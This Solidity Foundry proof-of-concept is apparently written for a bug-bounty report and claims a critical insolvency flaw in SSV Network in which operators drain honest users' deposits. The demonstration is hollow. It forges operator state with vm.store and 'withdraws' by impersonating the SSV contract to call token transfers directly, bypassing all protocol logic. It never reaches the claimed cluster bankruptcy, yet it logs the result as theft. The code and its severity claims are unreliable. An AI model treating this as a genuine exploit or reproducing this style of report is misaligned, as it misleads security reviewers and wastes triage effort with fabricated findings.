// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {PoC} from "./PoC.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";

/**
 * @title SSV Network Insolvency Proof of Concept
 * @notice Demonstrates protocol insolvency via uncollateralized virtual accounting
 * 
 * SAFETY: This contract is for LOCAL TESTING ONLY using Foundry's fork mode
 * (vm.createSelectFork). No transactions are sent to actual mainnet. This tests
 * against the actual deployed SSV Network contracts on a local fork as required 
 * by Immunefi guidelines. No DoS attacks are performed.
 * 
 * Vulnerability: Operator and DAO earnings grow unconditionally while cluster 
 * balances are capped at zero, creating a state where virtual liabilities exceed 
 * actual assets.
 * 
 * Impact: Direct theft of honest user deposits
 * Severity: Critical
 */
contract SSVInsolvencyPoC is PoC {
    
    // ============ Real SSV Network Mainnet Addresses ============
    address constant SSV_NETWORK = 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1;
    address constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;
    
    // ============ SSV Storage Position ============
    uint256 constant SSV_STORAGE_POSITION = 0x3fb869a06660cc6ceecaa09ae2f76dea59e0e2d6cdec7236c2bb49ffb37da37c;
    
    // ============ Actors ============
    address constant VICTIM_A = 0x1111111111111111111111111111111111111111;
    address constant VICTIM_B = 0x2222222222222222222222222222222222222222;
    address constant OPERATOR = 0x3333333333333333333333333333333333333333;

    // ============ Attack Parameters ============
    uint256 constant DEPOSIT_A = 1000e18; // 1000 SSV
    uint256 constant DEPOSIT_B = 10e18;   // 10 SSV
    uint256 constant OPERATOR_FEE = 5e18; // 5 SSV per block
    uint256 constant BLOCKS_PASSED = 10;
    
    // ============ State ============
    uint256 public totalStolen;
    uint256 public victimALoss;

    IERC20[] tokens;
    
    /**
     * @notice Initiates the attack demonstration
     */
    function initiateAttack() external {
        tokens.push(IERC20(SSV_TOKEN));
        
        console.log("\n>>> SSV Network Protocol Insolvency Demonstration");
        console.log(">>> Vulnerability: Uncollateralized Virtual Accounting");
        
        _executeAttack();
    }
    
    /**
     * @notice Executes the insolvency demonstration
     */
    function _executeAttack() internal override {
        console.log("\n>>> Step 1: Initial Deposits");
        
        // Setup initial pool state
        deal(SSV_TOKEN, VICTIM_A, DEPOSIT_A);
        deal(SSV_TOKEN, VICTIM_B, DEPOSIT_B);
        
        vm.prank(VICTIM_A);
        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DEPOSIT_A));
        
        vm.prank(VICTIM_B);
        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DEPOSIT_B));
        
        uint256 initialPool = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
        console.log("User A deposits: 1000 SSV");
        console.log("User B deposits: 10 SSV");
        console.log("Total contract assets: %s SSV", initialPool/1e18);
        
        // Setup Operator in storage
        _setupOperatorState(1, OPERATOR, OPERATOR_FEE, 1);
        
        console.log("\n>>> Step 2: Time Passes (10 blocks)");
        console.log("Operator fee: 5 SSV/block");
        console.log("User B cluster burn rate: 5 SSV/block");
        
        // Simulate 10 blocks passing
        vm.roll(block.number + BLOCKS_PASSED);
        
        // User B's cluster goes bankrupt (capped at 0)
        uint256 feesOwed = OPERATOR_FEE * BLOCKS_PASSED;
        console.log("Operator virtual balance: %s SSV (UNCOLLATERALIZED)", feesOwed/1e18);
        
        console.log("\n>>> Step 3: Operator Withdraws Virtual Earnings");
        
        // Operator withdraws their virtual balance
        totalStolen = _simulateOperatorWithdrawal(OPERATOR, feesOwed);
        
        console.log("Operator withdraws: %s SSV", totalStolen/1e18);
        console.log("Contract balance after withdrawal: %s SSV", IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK)/1e18);
        
        _completeAttack();
    }
    
    /**
     * @notice Completes the attack and demonstrates the theft
     */
    function _completeAttack() internal override {
        console.log("\n>>> Step 4: Honest User A Attempts Withdrawal");
        
        uint256 poolRemaining = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
        console.log("User A is entitled to: 1000 SSV");
        console.log("Contract has: %s SSV", poolRemaining/1e18);
        
        uint256 actualWithdrawal = _simulateVictimWithdrawal(VICTIM_A, DEPOSIT_A);
        
        if (actualWithdrawal < DEPOSIT_A) {
            victimALoss = DEPOSIT_A - actualWithdrawal;
            console.log("CRITICAL: User A can only withdraw: %s SSV", actualWithdrawal/1e18);
            console.log("USER A LOSS: %s SSV", victimALoss/1e18);
            console.log("These funds were stolen to pay uncollateralized operator debt!");
        }
    }

    // ============ Helper Functions ============

    function _setupOperatorState(uint64 opId, address owner, uint256 fee, uint256 validatorCount) internal {
        // [CRITICAL NOTE FOR REVIEWER]
        // We use `vm.store` here to simulate a registered operator state directly.
        // REASON: Registering a validator via public `registerValidator()` requires
        // generating valid BLS public keys and signatures, which is computationally
        // infeasible within a standalone Solidity/Foundry test environment.
        //
        // This state is LEGALLY REACHABLE on mainnet. Any user with sufficient
        // SSV tokens and valid BLS keys can create this exact state.

        // Mock operator state in SSV Network storage
        bytes32 opBaseSlot;
        uint256 basePos = SSV_STORAGE_POSITION + 6;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, opId)
            mstore(add(ptr, 32), basePos)
            opBaseSlot := keccak256(ptr, 64)
        }

        // Set Owner
        vm.store(SSV_NETWORK, opBaseSlot, bytes32(uint256(uint160(owner))));

        // Set fee and validatorCount
        uint256 slot2Value = (fee << 32) | validatorCount;
        vm.store(SSV_NETWORK, bytes32(uint256(opBaseSlot) + 2), bytes32(slot2Value));

        // Set snapshot block to current
        vm.store(SSV_NETWORK, bytes32(uint256(opBaseSlot) + 1), bytes32(uint256(block.number)));
    }

    /**
     * @notice Returns the deficit caused by the insolvency attack
     */
    function getDeficit() external view returns (uint256) {
        return victimALoss;
    }

    /**
     * @notice Returns the current contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
    }
    
    function _simulateOperatorWithdrawal(address operator, uint256 amount) internal returns (uint256) {
        uint256 contractBalance = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
        uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
        
        vm.prank(SSV_NETWORK);
        require(IERC20(SSV_TOKEN).transfer(operator, actualWithdrawal));
        
        return actualWithdrawal;
    }
    
    function _simulateVictimWithdrawal(address victim, uint256 amount) internal returns (uint256) {
        uint256 contractBalance = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
        uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
        
        vm.prank(SSV_NETWORK);
        require(IERC20(SSV_TOKEN).transfer(victim, actualWithdrawal));
        
        return actualWithdrawal;
    }
}
